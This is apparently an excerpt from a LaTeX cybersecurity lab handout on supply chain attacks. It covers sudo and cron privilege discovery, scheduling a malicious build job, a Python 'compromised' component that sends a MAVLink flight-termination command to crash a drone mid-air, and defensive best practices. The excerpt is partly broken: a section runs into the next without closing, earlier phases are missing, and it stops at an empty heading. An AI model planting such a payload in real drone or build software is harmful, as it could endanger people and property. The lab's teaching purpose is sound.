\subsection{What is a Supply Chain Attack?}

\begin{hintbox}
\textbf{Supply Chain Attack Explained Simply}

Imagine you're buying a sandwich from your favorite shop. You trust the shop, so you don't check if someone poisoned the ingredients before they arrived at the shop. A supply chain attack is like poisoning the ingredients at the supplier level - the shop owner doesn't know, and neither do the customers!

In cybersecurity, this means hackers don't attack the final product directly. Instead, they sneak malicious code into the development process, so when the "clean" software gets installed, it's actually already compromised.

Famous examples: SolarWinds (2020), Codecov (2021), and many npm packages.
\end{hintbox}

\section{Background: MITRE ATT\&CK Framework}

\begin{hintbox}
\textbf{What is the MITRE ATT\&CK Framework?}

The MITRE ATT\&CK Framework is a globally recognized knowledge base of cyberattack techniques and tactics. It helps security professionals understand how real-world attackers operate, map their activities, and improve defenses.

\textbf{Key Concepts:}
\begin{itemize}
    \item \textbf{Tactics:} The attacker's goals (e.g., Initial Access, Persistence, Privilege Escalation)
    \item \textbf{Techniques:} How those goals are achieved (e.g., Phishing, Exploiting Vulnerabilities, Scheduled Tasks)
    \item \textbf{Procedures:} Real-world examples of how techniques are used
\end{itemize}

In this lab, you'll see MITRE IDs (like T1078) that map your actions to real attacker behaviors!
\end{hintbox}

\section{Background: What is Docker?}

\begin{hintbox}
\textbf{Docker in a Nutshell}

Docker is a tool that lets you run applications in isolated environments called \textbf{containers}. Think of containers as lightweight, portable virtual computers that always work the same way, no matter where you run them.

\textbf{Why use Docker?}
\begin{itemize}
    \item Easy to set up complex labs and environments
    \item Each container is separate and safe to experiment in
    \item Used by real companies for development and deployment

\section{Phase 3 - Finding Our Attack Vector}

\subsection{MITRE ATT\&CK Mapping}
\textbf{Technique:} T1053.003 - Scheduled Task/Job: Cron

\subsection{The Privilege Escalation Hunt}

We found the build script, but it's owned by root. We need to find a way to modify it. Let's check what special privileges our developer account has:

\begin{lstlisting}[language=bash, caption=Checking Privileges]
# Check what commands we can run as root
sudo -l

# Look for scheduled tasks (cron jobs)
crontab -l

# Check if there are any system-wide cron jobs
ls -la /etc/cron*
cat /etc/crontab
\end{lstlisting}

\begin{hintbox}
\textbf{What is sudo?}

\texttt{sudo} stands for "Super User DO". It allows regular users to run specific commands as the root (administrator) user. 

When you run \texttt{sudo -l}, you're asking: "What am I allowed to do as root?"

If a system is misconfigured, you might find that you can run dangerous commands as root, even from a regular user account!
\end{hintbox}

\begin{challengebox}{Privilege Discovery}
When you run \texttt{sudo -l} and find that you can run some commands without a password (look for "NOPASSWD"), you've found a critical security vulnerability! Write down the flag below:

\texttt{FOUND\_SUDO\_PRIVILEGES}

\noindent\rule{\linewidth}{0.4pt}\\[2em]
\end{challengebox}

\subsection{Understanding Cron Jobs}

Cron is like a robot assistant that runs commands automatically on a schedule:

\begin{lstlisting}[language=bash, caption=Setting Up Malicious Cron Job]
# Create a malicious cron job to trigger our supply chain attack
sudo crontab -e

# Add this line to run the build script every 2 minutes:
# */2 * * * * /opt/build-update.sh

# Verify the cron job was installed
sudo crontab -l
\end{lstlisting}

\begin{hintbox}
\textbf{How to Read Cron Syntax}

A cron job looks like: \texttt{*/2 * * * * /opt/build-update.sh}

The five stars represent:
\begin{itemize}
    \item \texttt{*/2} = every 2 minutes
    \item \texttt{*} = every hour
    \item \texttt{*} = every day of month
    \item \texttt{*} = every month
    \item \texttt{*} = every day of week
\end{itemize}

So \texttt{*/2 * * * *} means "every 2 minutes"!
\end{hintbox}

\section{Phase 4: Supply Chain Compromise}

\subsection{MITRE ATT\&CK Mapping}
\textbf{Technique:} T1195.002 - Compromise Software Supply Chain

\subsection{Analysis of the Compromised Component}

After the cron job executes automatically, the RTL component gets replaced:

\begin{lstlisting}[language=python, caption=Compromised RTL Implementation]
def send_flight_termination_command(master):
    """Send flight termination command to force the drone 
       to shut down in mid-air."""
    master.mav.command_long_send(
        master.target_system,
        master.target_component,
        mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
        0,  # Confirmation
        1,  # Param1: 1 to initiate flight termination
        0, 0, 0, 0, 0, 0  # Other params unused
    )
    print("CRITICAL: Flight termination command sent")
\end{lstlisting}

\begin{warningbox}
\textbf{Understanding the Attack}

What just happened is the core of a supply chain attack:
\begin{enumerate}
    \item We used legitimate access (developer account)
    \item We exploited a misconfiguration (sudo crontab access)
    \item We scheduled malicious code to be deployed automatically
    \item The build system now deploys compromised software every 2 minutes
    \item Anyone using the "updated" software will run our malicious code
\end{enumerate}

This is exactly how real-world supply chain attacks work!
\end{warningbox}

\section{Defense and Mitigation}

\subsection{How to Prevent Supply Chain Attacks}

Now that you understand how these attacks work, let's learn how to defend against them:

\begin{warningbox}
\textbf{Security Best Practices}

\textbf{1. Strong Authentication}
\begin{itemize}
    \item Use strong, unique passwords
    \item Implement multi-factor authentication
    \item Regular password rotation
\end{itemize}

\textbf{2. Privilege Management}
\begin{itemize}
    \item Follow principle of least privilege
    \item Remove unnecessary sudo permissions
    \item Audit privileged access regularly
\end{itemize}

\textbf{3. Build System Security}
\begin{itemize}
    \item Code signing and verification
    \item Isolated build environments
    \item Automated security scanning
    \item Change monitoring and approval processes
\end{itemize}

\textbf{4. Monitoring and Detection}
\begin{itemize}
    \item File integrity monitoring
    \item Continuous security monitoring
    \item Anomaly detection
    \item Regular security audits
\end{itemize}
\end{warningbox}

\subsection{Implementing Basic Defenses}

Let's implement some basic security measures:
